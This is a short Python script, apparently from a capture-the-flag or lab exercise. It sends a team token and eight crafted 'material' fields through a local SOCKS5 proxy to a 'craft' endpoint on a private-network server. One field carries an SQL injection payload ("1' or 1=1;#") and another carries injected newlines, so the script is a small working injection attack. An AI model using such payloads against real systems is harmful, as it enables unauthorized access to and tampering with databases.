import socks
import socket
import requests
import json
import random

token = '2544876c41de80488474ee6f64b3f25d'
url = f'http://10.102.100.20:8000/%s?team_token={token}'

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9000)
socket.socket = socks.socksocket    

print('proxy connected')

targets = ['Galactic Singularity', '\n\nBlack Hole', 'Astral Explosion', 'Extreme Catastrophe', 'Absolute Everythingness', 'Massive Black Hole', 'Extreme Fire', "1' or 1=1;#"]


data = {
    f'material{i}': targets[i]
    for i in range(8)
}
data['team_token'] = token

res = requests.post(
    url % 'craft',
    data = json.dumps(data)
)

print(str(data.values()).replace(token, ''), res.text)

